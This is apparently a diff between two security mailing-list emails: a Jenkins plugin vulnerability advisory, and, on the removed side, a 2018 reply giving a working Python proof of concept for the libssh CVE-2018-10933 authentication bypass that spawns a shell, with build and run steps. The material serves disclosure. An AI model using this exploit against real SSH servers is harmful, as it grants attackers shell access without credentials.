@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2008" "Wednesday" "17" "October" "2018" "16:13:24" "+0700" "Minh Tuan Luong" "not.soledad@gmail.com" "<ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>" "67" "Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in server code" nil nil nil "10" "2018101709:13:24" "[oss-security] CVE-2018-10933: libssh: authentication bypass in server code" (number mark "U       not.soledad@ Oct 17   67/2008  " thread-indent "\"Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in server code\"\n") "<20181016122143.o7bwrhh3chhmhguk@suse.de>" ("<20181016122143.o7bwrhh3chhmhguk@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7254" "Wednesday" "23" "October" "2019" "14:41:17" "+0200" "Daniel Beck" "ml@beckweb.net" "<97B9396D-7627-4EC0-9D42-C84A908DED08@beckweb.net>" "186" "[oss-security] Multiple vulnerabilities in Jenkins plugins" nil nil nil "10" "2019102312:41:17" "[oss-security] Multiple vulnerabilities in Jenkins plugins" (number mark "U       ml@beckweb.n Oct 23  186/7254  " thread-indent "\"[oss-security] Multiple vulnerabilities in Jenkins plugins\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Multiple vulnerabilities in Jenkins plugins" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 30650 invoked by uid 550); 17 Oct 2018 12:47:24 -0000
+Received: (qmail 16263 invoked by uid 550); 23 Oct 2019 12:41:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,114 +12,203 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6022 invoked from network); 17 Oct 2018 09:13:48 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=subject:to:references:from:message-id:date:user-agent:mime-version
-         :in-reply-to:content-transfer-encoding:content-language;
-        bh=Zpvj4AejtFkVUXw0aA3nqKE2w4KirfeKWM1E0GgTFCM=;
-        b=XdWoE7HjJHL10zaLvHKJVljrX0LZd5FAWKm/aWzA39FFZR5ByI2ruMlij+RHg5JgS0
-         m5RnbyU0or8iefIVDa02WC7Da1lS4W7zb+2oc9+F3xYNKGzyAQ2zYLhjfphgG1ifCO5q
-         0WwLwEoXueeXXd4QCMmrywcZxVdo7KmtCcQsFnNl96A+W5VKgBzW7rSinxLtnQsOZiEI
-         aNEzXUJN4t059AgKZHZZ7sTYonN76aWcZxko3GzhCsglyRoFvesfp87dp9PvlLsQOkfz
-         EycRKfY8ieJMwSJIvjjDsY8R1o90LeReZ5j3dYi1AUJf2CaVpGwXHBSglsmFzkErqu/V
-         DaWg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:subject:to:references:from:message-id:date
-         :user-agent:mime-version:in-reply-to:content-transfer-encoding
-         :content-language;
-        bh=Zpvj4AejtFkVUXw0aA3nqKE2w4KirfeKWM1E0GgTFCM=;
-        b=CSYvu7eDAEnRmyQVNrROdcJfC6woXLvA9238Wu27LrRpIuYOWmjeAsn6+6bIEkq6M4
-         zZMzRvAiybJ/UNrmxfsFKjytoqOs6+xFkbgpC9EuvIiudOdqiL9ID4fvKEyKWb0IZkms
-         0w2KGjPkj+i+eMcxqfH3WdMMdegVTii0bvSz/TmUISCg/XbABVOZ61jAMmXmHMpUdWQR
-         tlsIB7lIoNZ3iWvWat6+sAzzF5qUuTNtrdYUtqWIk4YZYEYzstCaQX7cgBNa3RjjnYOQ
-         DdfgG+RXkb6ofPW91u2oje/hUYuBqR13vq9jII6/urxqd045CKfRIIkw74LbsQvGC+b2
-         RdPg==
-X-Gm-Message-State: ABuFfojpl3oiyBKHafQeLe+e8uRiMEp8ypHegMhcuEeLnwd+QPW+Bolv
-	z9vB3SWZ8+rMmJYr5xzS2JW58+u+
-X-Google-Smtp-Source: ACcGV61mwzKTEs4Yfbi+R9GtwrItikzBlTZwkPadqMRz9iG1HpYy2WURl78xNAOixUsRVrwfu+JEYQ==
-X-Received: by 2002:a17:902:a618:: with SMTP id u24-v6mr24877151plq.77.1539767615611;
-        Wed, 17 Oct 2018 02:13:35 -0700 (PDT)
+Received: (qmail 16244 invoked from network); 23 Oct 2019 12:41:29 -0000
+From: Daniel Beck <ml@beckweb.net>
+Content-Type: text/plain;
+	charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Mime-Version: 1.0 (Mac OS X Mail 12.4 \(3445.104.11\))
+Message-Id: <97B9396D-7627-4EC0-9D42-C84A908DED08@beckweb.net>
+Date: Wed, 23 Oct 2019 14:41:17 +0200
 To: oss-security@lists.openwall.com
-References: <20181016122143.o7bwrhh3chhmhguk@suse.de>
-From: Minh Tuan Luong <not.soledad@gmail.com>
-Message-ID: <ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>
-Date: Wed, 17 Oct 2018 16:13:24 +0700
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101
- Thunderbird/52.9.1
-MIME-Version: 1.0
-In-Reply-To: <20181016122143.o7bwrhh3chhmhguk@suse.de>
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 8bit
-Content-Language: en-US
-Subject: Re: [oss-security] CVE-2018-10933: libssh: authentication bypass in
- server code
+X-Mailer: Apple Mail (2.3445.104.11)
+X-bounce-key: webpack.hosteurope.de;ml@beckweb.net;1571834489;454763b0;
+X-HE-SMSGID: 1iNFwz-0007yC-IB
+Subject: [oss-security] Multiple vulnerabilities in Jenkins plugins
 
-I have coded a simple POC for this CVE:
+Jenkins is an open source automation server which enables developers around
+the world to reliably build, test, and deploy their software. The following
+releases contain fixes for security vulnerabilities:
 
---- CVE-2018-10933.py ----
+* Bitbucket OAuth Plugin 0.10
+* Dynatrace Application Monitoring Plugin 2.1.4
+* Mattermost Notification Plugin 2.7.1
+* Zulip Plugin 1.1.1
 
-import paramiko
-import socket
-import sys
+Additionally, we announce unresolved security issues in the following
+plugins:
 
-nbytes = 4096
-hostname = "127.0.0.1"
-port = 2222
+* 360 FireLine Plugin
+* build-metrics Plugin
+* Deploy WebLogic Plugin
+* Dynatrace Application Monitoring Plugin
+* ElasticBox Jenkins Kubernetes CI/CD Plugin
+* Global Post Script Plugin
+* Libvirt Slaves Plugin
+* Sonar Gerrit Plugin
 
-sock = socket.socket()
-try:
-     sock.connect((hostname, port))
-     # instantiate transport
-     m = paramiko.message.Message()
-     transport = paramiko.transport.Transport(sock)
-     transport.start_client()
+Summaries of the vulnerabilities are below. More details, severity, and
+attribution can be found here:
+https://jenkins.io/security/advisory/2019-10-23/
 
-     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
-     transport._send_message(m)
+We provide advance notification for security updates on this mailing list:
+https://groups.google.com/d/forum/jenkinsci-advisories
 
-     cmd_channel = transport.open_session()
-     cmd_channel.invoke_shell()
+If you discover security vulnerabilities in Jenkins, please report them as
+described here:
+https://jenkins.io/security/#reporting-vulnerabilities
 
-except socket.error:
-     print '[-] Connecting to host failed. Please check the specified 
-host and port.'
-     sys.exit(1)
+---
 
------
+SECURITY-1628 / CVE-2019-10459
+Mattermost allows the definition of incoming (from the perspective of the
+service) webhook URLs. These contain what is effectively a secret token as
+part of the URL.
 
-to test this code: get vulnerable version of libssh at homepage: 
-https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
-after uncompress and build, go to example directory, there's a simple 
-sshd server using libssh name: samplesshd-cb
+Mattermost Notification Plugin stored these webhook URLs as part of its
+global configuration file jenkins.plugins.mattermost.MattermostNotifier.xml
+and job config.xml files on the Jenkins master. These URLs could be viewed
+by users with Extended Read permission (in the case of job config.xml files)
+or access to the master file system.
 
-run this simple sshd by command:
-     $ samplesshd-cb 127.0.0.1 -p 2222
-then run my code, output will be:
-Allocated session channel
-Allocated shell
-mean that i can bypass authentication and spawn a shell without any 
-credential
 
-Regard, Soledad
+SECURITY-1546 / CVE-2019-10460
+Bitbucket OAuth Plugin stored a credential unencrypted in the global
+config.xml configuration file on the Jenkins master. This credential could
+be viewed by users with access to the master file system.
 
-On 10/16/2018 7:21 PM, Marcus Meissner wrote:
-> Hi,
->
-> https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
->
-> -----
-> libssh 0.8.4 and 0.7.6 security and bugfix release
->
-> This is an important security and maintenance release in order to address CVE-2018-10933.
->
-> libssh versions 0.6 and above have an authentication bypass vulnerability in the server code. By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect to initiate authentication, the attacker could successfully authentciate without any credentials.
->
-> The bug was discovered by Peter Winter-Smith of NCC Group.
-> -----
->
-> This only affects libssh operating in _server_ mode, but not the usual used client mode.
->
-> Ciao, Marcus
+Bitbucket OAuth Plugin now stores this credential encrypted.
+
+
+SECURITY-1621 / CVE-2019-10476
+Zulip Plugin stored a credential unencrypted in its global configuration
+file jenkins.plugins.zulip.ZulipNotifier.xml, as well as in the legacy
+configuration file hudson.plugins.humbug.HumbugNotifier.xml on the Jenkins
+master. This credential could be viewed by users with access to the master
+file system.
+
+
+SECURITY-1477 / CVE-2019-10461
+Dynatrace Application Monitoring Plugin stored a credential unencrypted in
+its global configuration file
+com.dynatrace.jenkins.dashboard.TAGlobalConfiguration.xml on the Jenkins
+master. This credential could be viewed by users with access to the master
+file system.
+
+
+SECURITY-1483 (1) / CVE-2019-10462
+Dynatrace Application Monitoring Plugin did not require POST requests on a
+method implementing form validation. This CSRF vulnerability allowed
+attackers to initiate a connection test to an attacker-specified server
+with attacker-specified username and password.
+
+
+SECURITY-1483 (2) / CVE-2019-10463
+Dynatrace Application Monitoring Plugin does not perform permission checks
+on a method implementing form validation. This allows users with
+Overall/Read access to Jenkins to initiate a connection test to an
+attacker-specified server with attacker-specified username and password.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-820 / CVE-2019-10464 (CSRF), CVE-2019-10465 (permission check)
+Deploy WebLogic Plugin does not perform permission checks on a method
+implementing form validation. This allows users with Overall/Read access to
+Jenkins to send an HTTP HEAD request to a user-specified URL, or confirm
+the existence of any file or directory on the Jenkins master.
+
+Additionally, the form validation method does not require POST requests,
+resulting in a CSRF vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-822 / CVE-2019-10466
+360 FireLine Plugin accepts XML for part of its configuration. It does not
+configure the XML parser to prevent XML external entity (XXE) attacks.
+
+A form validation method that accepts XML does not perform permission
+checks. This allows users with Overall/Read permission to have Jenkins
+parse a crafted XML file that uses external entities for extraction of
+secrets from the Jenkins agent, server-side request forgery, or
+denial-of-service attacks.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1003 / CVE-2019-10467
+Sonar Gerrit Plugin stores a credential unencrypted in job config.xml files
+on the Jenkins master if the 'Override Credentials' option is used. This
+credential can be viewed by users with Extended Read permission or access
+to the master file system.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1005 (1) / CVE-2019-10468 (CSRF), CVE-2019-10469 (permission check)
+ElasticBox Jenkins Kubernetes CI/CD Plugin does not perform permission
+checks on a method implementing form validation. This allows users with
+Overall/Read access to Jenkins to connect to an attacker-specified URL
+using attacker-specified credentials IDs obtained through another method,
+capturing credentials stored in Jenkins.
+
+Additionally, the form validation method does not require POST requests,
+resulting in a CSRF vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1005 (2) / CVE-2019-10470
+ElasticBox Jenkins Kubernetes CI/CD Plugin provides a list of applicable
+credential IDs to allow users configuring the plugin to select the one to
+use.
+
+This functionality does not correctly check permissions, allowing any user
+with Overall/Read permission to get a list of valid credentials IDs. Those
+can be used as part of an attack to capture the credentials using another
+vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1014 (1) / CVE-2019-10471 (CSRF), CVE-2019-10472 (permission check)
+Libvirt Slaves Plugin does not perform permission checks on a method
+implementing form validation. This allows users with Overall/Read access to
+Jenkins to connect to an attacker-specified SSH server using
+attacker-specified credentials IDs obtained through another method,
+capturing credentials stored in Jenkins.
+
+Additionally, the form validation method does not require POST requests,
+resulting in a CSRF vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1014 (2) / CVE-2019-10473
+Libvirt Slaves Plugin provides a list of applicable credential IDs to allow
+users configuring the plugin to select the one to use.
+
+This functionality does not correctly check permissions, allowing any user
+with Overall/Read permission to get a list of valid credentials IDs. Those
+can be used as part of an attack to capture the credentials using another
+vulnerability.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1073 / CVE-2019-10474
+Global Post Script Plugin does not perform permission checks on a method
+implementing form validation. This allows users with Overall/Read
+permission to list the files contained in $JENKINS_HOME/global-post-script
+that can be used by the plugin.
+
+As of publication of this advisory, there is no fix.
+
+
+SECURITY-1490 / CVE-2019-10475
+build-metrics Plugin does not properly escape the label query parameter,
+resulting in a reflected cross-site scripting vulnerability.
+
+As of publication of this advisory, there is no fix.
 
